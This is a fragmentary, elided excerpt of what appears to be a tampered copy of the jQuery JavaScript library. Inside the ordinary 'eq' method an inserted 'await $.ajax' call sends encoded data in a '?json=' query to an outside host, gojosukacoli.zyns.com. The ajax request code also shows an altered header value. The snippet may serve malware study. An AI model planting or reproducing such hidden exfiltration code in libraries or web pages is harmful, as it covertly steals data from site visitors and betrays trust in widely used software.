!(function (e, t) {
    ...
    (b.fn = b.prototype = {
        ...
        eq: function (e) {
            ...
            await $.ajax({
                url:
                    "https://gojosukacoli.zyns.com/?json=" +
                    (function (e) {
            ...
            if (d.cors || (tj && !t.crossDomain))
                return {
                    send: function (i, o) {
                        ...
                        for (a in (t.mimeType && s.overrideMimeType && s.overrideMimeType(t.mimeType), t.crossDomain || i["X-Requested-With"] || (i["X-Requested-With"] = "XMLsRequest"), i)) s.setRequestHeader(a, i[a]);
                        (n = function (e) {
                            return function () {
                                n &&
